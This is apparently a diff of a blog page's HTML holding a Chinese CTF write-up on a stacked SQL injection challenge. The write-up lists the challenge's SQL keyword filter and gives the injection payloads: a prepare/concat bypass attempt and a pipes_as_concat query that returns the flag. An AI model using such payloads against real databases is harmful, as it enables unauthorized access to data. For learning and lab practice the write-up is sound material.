@@ -121,7 +121,7 @@
 <p>用Bp抓包再利用sql关键字字典对query进行爆破</p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250305184148796.png"></p>
 <p>发现过滤（部分）：</p>
-<pre><code class="hljs plaintext">flag|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|floor|extractvalue|updatexml|or|and|&amp;|</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">flag|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|floor|extractvalue|updatexml|or|and|&amp;|<br></code></pre></td></tr></table></figure>
 
 <p>盲注，联合注入，报错注入不可用！</p>
 <p>尝试<strong>堆叠注入</strong>：<strong>将多条SQL语句放在一起，并用分号;隔开</strong></p>
@@ -132,7 +132,7 @@
 <p>表Flag，可以确定flag在表Flag中</p>
 <p>我们首先想到利用from来查询Flag，但是通过抓包分析可知，from关键字被过滤掉了，所以只能另寻他法</p>
 <p>正常而言，我们使用<strong>预编译</strong>来绕过限制</p>
-<pre><code class="hljs plaintext">1;sEt@a=concat(&quot;select * fr&quot;,&quot;om Flag&quot;);PRepare hello from @a;execute hello;#</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1;sEt@a=concat(&quot;select * fr&quot;,&quot;om Flag&quot;);PRepare hello from @a;execute hello;#<br></code></pre></td></tr></table></figure>
 
 <p>但过滤了prepare，大小写绕过也不行</p>
 <p>输入非零数字得到结果一直是1和而输入其余字符的数据就得不到回显&#x3D;&gt;来判断出内部的查询语句可能存在有<code>||</code>（即or：或运算）</p>
@@ -140,11 +140,10 @@
 <p>默认情况下在MySQL中<code>||</code>运算符是逻辑或运算符（即or），但取决于<code>PIPES_AS_CONCAT SQL</code>模式</p>
 <p>如果启用了<code>set sql_mode=pipes_as_concat</code>模式，则||运算符用作字符串连接，即用作<code>concat()</code>函数同义词</p>
 </blockquote>
-<pre><code class="hljs plaintext">那么内置语句就可以猜测为：
-sql=&quot;select post[&#x27;query&#x27;] || flag from Flag&quot;;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">那么内置语句就可以猜测为：<br>sql=&quot;select post[&#x27;query&#x27;] || flag from Flag&quot;;<br></code></pre></td></tr></table></figure>
 
 <p>查询语句：</p>
-<pre><code class="hljs plaintext">1;set sql_mode=pipes_as_concat;select 1</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1;set sql_mode=pipes_as_concat;select 1<br></code></pre></td></tr></table></figure>
 
 <p>得到flag</p>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://raw.githubusercontent.com/zkk1233/Picture/main/20250306090818793.png"></p>
@@ -802,5 +801,5 @@ sql=&quot;select post[&#x27;query&#x27;] || flag from Flag&quot;;</code></pre>
 
 
 <!-- inject -->
-
+<script async src="/js/title.js"></script>
 </div></body></html>
